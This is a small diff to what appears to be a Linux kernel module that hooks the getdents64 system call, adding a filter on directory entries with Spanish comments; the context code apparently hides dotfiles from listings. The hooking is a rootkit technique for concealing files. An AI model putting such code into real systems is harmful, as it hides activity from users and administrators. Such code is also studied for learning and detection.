@@ -68,6 +68,12 @@ asmlinkage int hook_getdents64(const struct pt_regs *regs)
 		if (current_dir->d_reclen == 0 || offset + current_dir->d_reclen > ret)
             break;
 
+        // Solo dejar pasar archivos
+		 if (current_dir->d_type != DT_REG) {
+            offset += current_dir->d_reclen;
+            continue;
+        }
+
         /* Comparamos si el primer digito es un punto, ya que
 		en Linux es un estandar "ocultar" archivos con el punto */
         if (current_dir->d_name[0] == '.')
